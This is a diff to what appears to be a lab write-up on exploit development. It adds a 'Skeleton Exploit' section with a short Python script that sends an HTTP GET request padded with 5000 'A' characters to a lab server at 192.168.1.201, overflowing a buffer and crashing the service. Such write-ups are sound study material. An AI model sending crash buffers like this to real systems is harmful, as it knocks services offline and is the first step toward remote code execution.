@@ -118,7 +118,29 @@ Again we get a crash and EAX is overwritten with `C` values. So we know for cert
 
 ![](/assets/images/CTP/efscrash2.JPG)
 
+## Skeleton Exploit
 
+The first thing I did at this point was google for 'http skeleton exploits' and came across this [github repo](https://github.com/HanseSecure/ExploitDev/tree/master/poc) which included an http exploit skeleton. After modifying it slightly to fit my personal taste and our vulnerability analysis up to this point, our skeleton looks like this:
+```python
+import socket
+import os
+import sys
+
+ip = "192.168.1.201"
+port = 80
+
+crash = "A" * 5000
+
+
+buffer="GET\n"
+buffer+=crash
+buffer+=" HTTP/1.1\r\n"
+
+expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
+expl.connect((ip, port))
+expl.send(buffer)
+expl.close()
+```
 
 ## Resources
 
